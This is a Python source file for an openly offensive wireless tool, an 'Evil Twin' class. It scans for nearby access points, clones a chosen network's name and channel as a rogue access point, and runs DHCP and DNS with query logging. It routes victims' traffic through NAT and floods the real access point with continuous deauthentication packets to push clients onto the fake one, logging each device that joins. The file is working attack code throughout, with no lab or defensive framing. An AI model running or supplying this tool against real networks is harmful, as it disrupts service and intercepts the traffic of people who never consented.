import os
import subprocess
import time
import re
import glob
import csv
import threading
import shutil
import tempfile
from datetime import datetime

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

class EvilTwin:
    def __init__(self, deauth_interface, log_func):
        self.deauth_interface = deauth_interface
        self.ap_interface = None
        self._log = log_func
        self.active_processes = []
        self.dnsmasq_log_path = ""
        self.hostapd_conf_path = ""
        self.monitor_thread_stop_event = threading.Event()
        self.internet_interface = None
        self.original_forward_policy = None

    def _run_command(self, command, shell=False, quiet=False):
        """Executes a shell command."""
        try:
            if quiet:
                return subprocess.run(command, shell=shell, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            else:
                return subprocess.run(command, shell=shell, check=True)
        except FileNotFoundError:
            print(f"{RED}Error: Command not found: {command[0]}{NC}")
            self._log("ERROR", f"Command not found: {command[0]}")
            return None
        except subprocess.CalledProcessError as e:
            if not quiet:
                if e.returncode != -2:
                    print(f"{RED}Error executing command: {' '.join(command)}{NC}")
                    if e.stderr:
                        print(f"Stderr: {e.stderr.strip()}")
            self._log("ERROR", f"Command failed: {' '.join(command)} - {e.stderr}")
            return None
        except Exception as e:
            print(f"{RED}An unexpected error occurred: {e}{NC}")
            self._log("ERROR", f"An unexpected error occurred with command {' '.join(command)}: {e}")
            return None

    def _select_ap_interface(self):
        """Detects and allows user to select a second interface for the fake AP."""
        print(f"{YELLOW}[*] Detecting wireless interfaces to use for the Fake Access Point...{NC}")
        interfaces = []
        try:
            all_ifaces = os.listdir('/sys/class/net')
            for iface in all_ifaces:
                if iface == self.deauth_interface:
                    continue
                if os.path.exists(f'/sys/class/net/{iface}/phy80211/name'):
                    interfaces.append(iface)
        except Exception as e:
            print(f"{RED}Error detecting interfaces: {e}{NC}")
            self._log("ERROR", f"Failed to detect AP interfaces: {e}")
            return None

        if not interfaces:
            print(f"{RED}No suitable secondary wireless interface found to create an AP.{NC}")
            print(f"{YELLOW}An Evil Twin attack requires a second wireless card.{NC}")
            time.sleep(4)
            return None

        while True:
            print("\nPlease select the SECONDARY interface to use for the FAKE AP:")
            for i, iface in enumerate(interfaces):
                print(f"  {i + 1}) {iface}")
            print(f"  {len(interfaces) + 1}) Cancel")

            choice = input(f"\n{YELLOW}Select an interface [1-{len(interfaces)}/cancel]: {NC}").strip().lower()
            if choice == str(len(interfaces) + 1) or choice == 'cancel':
                return None
            try:
                selected_index = int(choice) - 1
                if 0 <= selected_index < len(interfaces):
                    ap_iface = interfaces[selected_index]
                    print(f"{GREEN}[✔] Fake AP interface selected: {ap_iface}{NC}")
                    return ap_iface
                else:
                    print(f"{RED}Invalid selection. Please try again.{NC}")
            except ValueError:
                print(f"{RED}Invalid input. Please enter a number.{NC}")
            time.sleep(1)

    def _get_internet_interface(self):
        """Detects the primary internet-connected interface, excluding deauth and AP interfaces."""
        try:
            route_output = self._run_command(['ip', 'route', 'show', 'default'], quiet=True)
            if route_output and route_output.stdout:
                routes = route_output.stdout.strip().split('\n')
                for route in routes:
                    match = re.search(r'dev\s+(\S+)', route)
                    if match:
                        iface = match.group(1)
                        if iface != self.deauth_interface and iface != self.ap_interface:
                            return iface
        except Exception as e:
            self._log("ERROR", f"Failed to detect internet interface: {e}")
        return None

    def start_attack(self):
        print(f"{YELLOW}[*] Starting Evil Twin Attack...{NC}")
        print(f"{YELLOW}[*] Deauthentication Interface: {self.deauth_interface} (Monitor Mode){NC}")
        self._log("INFO", "Evil Twin attack initiated.")

        if not shutil.which("hostapd") or not shutil.which("dnsmasq"):
            print(f"{RED}Error: hostapd or dnsmasq is not installed. Please install them.{NC}")
            self._log("ERROR", "hostapd or dnsmasq not found. Aborting Evil Twin attack.")
            time.sleep(3)
            return

        target_ap = self._scan_and_select_ap()
        if not target_ap:
            print(f"{RED}[!] No target AP selected. Aborting Evil Twin attack.{NC}")
            return

        print(f"{GREEN}[✔] Selected target AP: {target_ap['essid']} ({target_ap['bssid']}) on channel {target_ap['channel']}{NC}")
        
        self.ap_interface = self._select_ap_interface()
        if not self.ap_interface:
            print(f"{RED}[!] No AP interface selected. Aborting Evil Twin attack.{NC}")
            return
            
        print(f"{GREEN}[✔] Fake AP will be created on: {self.ap_interface}{NC}")

        wpa_passphrase = ""
        if "WPA" in target_ap['privacy']:
            while True:
                wpa_passphrase = input(f"{YELLOW}[?] Enter WPA2 password for '{target_ap['essid']}': {NC}").strip()
                if len(wpa_passphrase) >= 8:
                    break
                else:
                    print(f"{RED}[!] WPA2 passphrase must be at least 8 characters long.{NC}")
        
        print(f"{YELLOW}[*] Preparing interface {self.ap_interface} for AP mode...{NC}")
        self._run_command(['systemctl', 'stop', 'NetworkManager'], quiet=True)
        self._run_command(['airmon-ng', 'check', 'kill'], quiet=True)
        self._run_command(['ifconfig', self.ap_interface, 'down'], quiet=True)
        self._run_command(['iw', 'dev', self.ap_interface, 'set', 'type', 'managed'], quiet=True)
        self._run_command(['ifconfig', self.ap_interface, 'up'], quiet=True)
        time.sleep(3)

        print(f"{YELLOW}[*] Setting interface {self.ap_interface} to channel {target_ap['channel']}...{NC}")
        self._run_command(['iwconfig', self.ap_interface, 'channel', target_ap['channel']], quiet=True)
        
        hostapd_conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8')
        self.hostapd_conf_path = hostapd_conf_file.name
        with hostapd_conf_file as f:
            f.write(f"interface={self.ap_interface}\n")
            f.write(f"ssid={target_ap['essid']}\n")
            f.write(f"channel={target_ap['channel']}\n")
            f.write("hw_mode=g\n")
            if wpa_passphrase:
                f.write("wpa=2\n")
                f.write("wpa_key_mgmt=WPA-PSK\n")
                f.write("rsn_pairwise=CCMP\n")
                f.write(f"wpa_passphrase={wpa_passphrase}\n")

        hostapd_proc = subprocess.Popen(['hostapd', self.hostapd_conf_path], preexec_fn=os.setsid)
        self.active_processes.append(hostapd_proc)
        time.sleep(5)
        if hostapd_proc.poll() is not None:
            print(f"{RED}[!] hostapd failed to start. Aborting.{NC}")
            return

        print(f"{GREEN}[✔] Fake AP '{target_ap['essid']}' created on {self.ap_interface}.{NC}")

        self.internet_interface = self._get_internet_interface()
        if not self.internet_interface:
            print(f"{RED}[!] Could not automatically detect internet-connected interface.{NC}")
            manual_iface = input(f"{YELLOW}[?] Please manually enter the internet-connected interface (e.g., eth0, wlan0): {NC}").strip()
            if manual_iface:
                self.internet_interface = manual_iface
            else:
                print(f"{RED}[!] No internet interface provided. Clients may not have internet access.{NC}")
                self._log("WARNING", "No internet interface provided by user. NAT will not be configured.")

        if self.internet_interface:
            print(f"{YELLOW}[*] Enabling IP forwarding and NAT via {self.internet_interface}...{NC}")
            try:
                policy_output = self._run_command(['iptables', '-S', 'FORWARD'], quiet=True)
                if policy_output and policy_output.stdout:
                    match = re.search(r'-P\s+FORWARD\s+([A-Z]+)', policy_output.stdout, re.IGNORECASE)
                    if match:
                        self.original_forward_policy = match.group(1)
            except Exception as e:
                self._log("WARNING", f"Could not determine original FORWARD policy: {e}")
                self.original_forward_policy = "ACCEPT" # Default to ACCEPT if unable to determine

            self._run_command(['sysctl', '-w', 'net.ipv4.ip_forward=1'], quiet=True)
            self._run_command(['iptables', '-P', 'FORWARD', 'ACCEPT'], quiet=True)
            self._run_command(['iptables', '-A', 'FORWARD', '-i', self.ap_interface, '-o', self.internet_interface, '-j', 'ACCEPT'], quiet=True)
            self._run_command(['iptables', '-A', 'FORWARD', '-i', self.internet_interface, '-o', self.ap_interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'], quiet=True)
            self._run_command(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', self.internet_interface, '-j', 'MASQUERADE'], quiet=True)
            print(f"{GREEN}[✔] IP forwarding and NAT enabled.{NC}")
        else:
            self._log("WARNING", "Internet interface not set. NAT will not be configured.")

        self._run_command(['systemctl', 'stop', 'systemd-resolved'], quiet=True)
        self._run_command(['ip', 'addr', 'flush', 'dev', self.ap_interface], quiet=True)
        time.sleep(1)
        self._run_command(['pkill', '-15', 'dnsmasq'], quiet=True)
        time.sleep(1)
        self._run_command(['pkill', '-9', 'dnsmasq'], quiet=True)
        self._run_command(['ifconfig', self.ap_interface, '10.0.0.1/24'], quiet=True)
        
        dnsmasq_conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8')
        self.dnsmasq_conf_path = dnsmasq_conf_file.name
        dnsmasq_log_file = tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8')
        self.dnsmasq_log_path = dnsmasq_log_file.name

        with dnsmasq_conf_file as f:
            f.write(f"interface={self.ap_interface}\n")
            f.write("listen-address=10.0.0.1\n")
            f.write("bind-interfaces\n")
            f.write("dhcp-range=10.0.0.10,10.0.0.100,12h\n")
            f.write("dhcp-option=3,10.0.0.1\n")
            f.write("dhcp-option=6,10.0.0.1\n")
            f.write("log-queries\n")
            f.write("log-dhcp\n")
            f.write(f"log-facility={self.dnsmasq_log_path}\n")
        
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', self.dnsmasq_conf_path], preexec_fn=os.setsid)
        self.active_processes.append(dnsmasq_proc)
        print(f"{GREEN}[✔] DHCP server started.{NC}")

        print(f"{YELLOW}[*] Sending deauth packets to real AP using {self.deauth_interface}...{NC}")
        deauth_cmd = ['aireplay-ng', '-0', '0', '-a', target_ap['bssid'], self.deauth_interface]
        deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        self.active_processes.append(deauth_proc)
        
        print(f"{GREEN}[✔] Deauthentication attack started.{NC}")
        print(f"{YELLOW}[*] Evil Twin attack is now active.{NC}")
        print(f"{RED}[!] Press Ctrl+C to stop the attack.{NC}")
        
        monitor_thread = threading.Thread(target=self._monitor_dhcp_leases, daemon=True)
        monitor_thread.start()

        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[*] Attack interrupted by user.{NC}")
        finally:
            self.monitor_thread_stop_event.set()
            if monitor_thread.is_alive():
                monitor_thread.join(timeout=2)

        print(f"{GREEN}[✔] Evil Twin Attack finished.{NC}")
        time.sleep(2)

    def _scan_and_select_ap(self):
        print(f"{YELLOW}[*] Scanning for Access Points for 15 seconds...{NC}")
        scan_prefix = f"/tmp/evil_twin_scan_{os.getpid()}"
        airodump_cmd = [
            'airodump-ng', '--write', scan_prefix,
            '--output-format', 'csv', '--band', 'abg', self.deauth_interface
        ]
        scan_proc = None
        try:
            scan_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(scan_proc)
            for i in range(15):
                print(f"\r{YELLOW}[*] Scanning... {i+1}/15s{NC}", end="", flush=True)
                time.sleep(1)
        finally:
            if scan_proc:
                if scan_proc.poll() is None:
                    scan_proc.terminate()
                if scan_proc in self.active_processes:
                    self.active_processes.remove(scan_proc)

        print(f"\n{GREEN}[✔] Scan complete. Analyzing targets...{NC}")
        csv_file = f"{scan_prefix}-01.csv"
        if not os.path.exists(csv_file):
            print(f"{RED}[!] Scan failed. No targets found.{NC}")
            return None

        aps = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                reader = csv.reader(f)
                in_ap_section = False
                for row in reader:
                    if not row: continue
                    row = [field.strip() for field in row]
                    if 'BSSID' in row[0]: in_ap_section = False; continue
                    if 'Station MAC' in row[0]: in_ap_section = True; break
                    if not in_ap_section and len(row) > 13:
                        bssid = row[0]
                        essid = row[13] if row[13] else "<hidden>"
                        channel = row[3]
                        privacy = row[5]
                        power = row[8]
                        if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                            aps.append({'bssid': bssid, 'essid': essid, 'channel': channel, 'privacy': privacy, 'power': power})
        finally:
            for f in glob.glob(f"{scan_prefix}*"): os.remove(f)

        if not aps:
            print(f"{RED}[!] No Access Points found.{NC}")
            return None

        while True:
            print(f"\n{BLUE}---[ SELECT TARGET AP FOR EVIL TWIN ]---{NC}")
            print(f"{'[NO]':<5}{'BSSID':<18}{'CH':<4}{'PWR':<6}{'ENCRYPTION':<12}{'ESSID'}")
            print("=" * 70)
            for i, ap in enumerate(aps):
                print(f"[{i+1:<3}] {ap['bssid']:<18}{ap['channel']:<4}{ap['power']:<6}{ap['privacy']:<12}{ap['essid']}")
            print("[q] Back to Main Menu")

            choice = input(f"\n{YELLOW}Select a target AP [1-{len(aps)}/q]: {NC}").strip().lower()
            if choice == 'q': return None
            try:
                selected_index = int(choice) - 1
                if 0 <= selected_index < len(aps):
                    return aps[selected_index]
                else:
                    print(f"{RED}Invalid selection.{NC}")
            except ValueError:
                print(f"{RED}Invalid input.{NC}")
            time.sleep(1)

    def _monitor_dhcp_leases(self):
        """Monitors the dnsmasq log file for new DHCP leases (client connections)."""
        print(f"{YELLOW}[*] Starting DHCP lease monitor...{NC}")
        self._log("INFO", "DHCP lease monitor started.")
        
        while not os.path.exists(self.dnsmasq_log_path) and not self.monitor_thread_stop_event.is_set():
            time.sleep(0.5)
        
        if not os.path.exists(self.dnsmasq_log_path):
            self._log("ERROR", "dnsmasq log file not found.")
            return

        try:
            tail_proc = subprocess.Popen(['tail', '-F', self.dnsmasq_log_path], 
                                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, 
                                         text=True, preexec_fn=os.setsid)
            self.active_processes.append(tail_proc)
            
            for line in iter(tail_proc.stdout.readline, ''):
                if self.monitor_thread_stop_event.is_set(): break
                match = re.search(r'DHCPACK\(.*\)\s+([\d.]+)\s+([0-9a-fA-F:]+)\s+([\w.-]+)?', line)
                if match:
                    ip, mac, host = match.groups()
                    print(f"\n{GREEN}[!!!] NEW CLIENT: IP={ip}, MAC={mac}, Host={host or 'Unknown'}{NC}")
                    self._log("INFO", f"New client: IP={ip}, MAC={mac}, Host={host or 'Unknown'}")
        except Exception as e:
            self._log("ERROR", f"Error monitoring DHCP leases: {e}")
        finally:
            if 'tail_proc' in locals() and tail_proc.poll() is None:
                tail_proc.terminate()
            if 'tail_proc' in locals() and tail_proc in self.active_processes:
                self.active_processes.remove(tail_proc)
            self._log("INFO", "DHCP lease monitor stopped.")

    def cleanup(self):
        print(f"{YELLOW}[*] Cleaning up Evil Twin processes...{NC}")
        for proc in self.active_processes:
            if proc.poll() is None:
                proc.terminate()
                try: proc.wait(timeout=2)
                except subprocess.TimeoutExpired: proc.kill()
        self.active_processes = []

        if self.hostapd_conf_path and os.path.exists(self.hostapd_conf_path):
            os.remove(self.hostapd_conf_path)
        if self.dnsmasq_conf_path and os.path.exists(self.dnsmasq_conf_path):
            try:
                os.remove(self.dnsmasq_conf_path)
            except OSError as e:
                self._log("WARNING", f"Failed to remove dnsmasq config file {self.dnsmasq_conf_path}: {e}")
        if self.dnsmasq_log_path and os.path.exists(self.dnsmasq_log_path):
            os.remove(self.dnsmasq_log_path)

        if self.ap_interface:
            print(f"{YELLOW}[*] Restoring AP interface {self.ap_interface}...{NC}")
            self._run_command(['ifconfig', self.ap_interface, 'down'], quiet=True)
            self._run_command(['iw', 'dev', self.ap_interface, 'set', 'type', 'managed'], quiet=True)
            self._run_command(['ifconfig', self.ap_interface, 'up'], quiet=True)

        print(f"{YELLOW}[*] Restarting NetworkManager...{NC}")
        self._run_command(['systemctl', 'start', 'NetworkManager'], quiet=True)
        print(f"{YELLOW}[*] Restarting systemd-resolved...{NC}")
        self._run_command(['systemctl', 'start', 'systemd-resolved'], quiet=True) # Restart systemd-resolved

        # Cleanup IP forwarding and NAT
        if hasattr(self, 'internet_interface') and self.internet_interface:
            print(f"{YELLOW}[*] Cleaning up IP forwarding and NAT rules...{NC}")
            self._run_command(['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', self.internet_interface, '-j', 'MASQUERADE'], quiet=True)
            self._run_command(['iptables', '-D', 'FORWARD', '-i', self.ap_interface, '-o', self.internet_interface, '-j', 'ACCEPT'], quiet=True)
            self._run_command(['iptables', '-D', 'FORWARD', '-i', self.internet_interface, '-o', self.ap_interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'], quiet=True)
            if self.original_forward_policy:
                self._run_command(['iptables', '-P', 'FORWARD', self.original_forward_policy], quiet=True) # Restore original FORWARD policy
            else:
                self._run_command(['iptables', '-P', 'FORWARD', 'ACCEPT'], quiet=True)
            self._run_command(['sysctl', '-w', 'net.ipv4.ip_forward=0'], quiet=True)

        self._log("INFO", "Evil Twin cleanup completed.")
